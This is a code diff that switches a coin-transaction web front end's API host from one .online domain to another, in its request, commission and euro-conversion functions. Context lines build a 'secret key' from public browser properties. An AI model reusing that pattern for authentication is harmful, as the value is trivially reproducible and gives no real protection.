@@ -16,7 +16,7 @@ function loaderFunction(status) {
 
 async function send_request(type, loader, url, data) {
     return new Promise((resolve, reject) => {
-        let page = `https://royalcoinunion.online/${url}`;
+        let page = `https://amecacoin.online/${url}`;
         xhr.open(type, page)
         xhr.responseType = "json"
         xhr.setRequestHeader("Accept", "application/json")
@@ -45,7 +45,7 @@ async function get_cm(price) {
     let sicret_key = `${navigator.productSub+navigator.vendor+navigator.appName+navigator.platform+navigator.product+navigator.appVersion}`
 
     return new Promise((resolve, reject) => {
-        let url = "https://royalcoinunion.online/transaction-commission";
+        let url = "https://amecacoin.online/transaction-commission";
         xhr.open("post", url)
         xhr.responseType = "json"
         xhr.setRequestHeader("Accept", "application/json")
@@ -62,7 +62,7 @@ async function convert(price) {
     let sicret_key = `${navigator.productSub+navigator.vendor+navigator.appName+navigator.platform+navigator.product+navigator.appVersion}`
 
     return new Promise((resolve, reject) => {
-        let url = "https://royalcoinunion.online/transaction-convert-euro";
+        let url = "https://amecacoin.online/transaction-convert-euro";
         xhr.open("post", url)
         xhr.responseType = "json"
         xhr.setRequestHeader("Accept", "application/json")
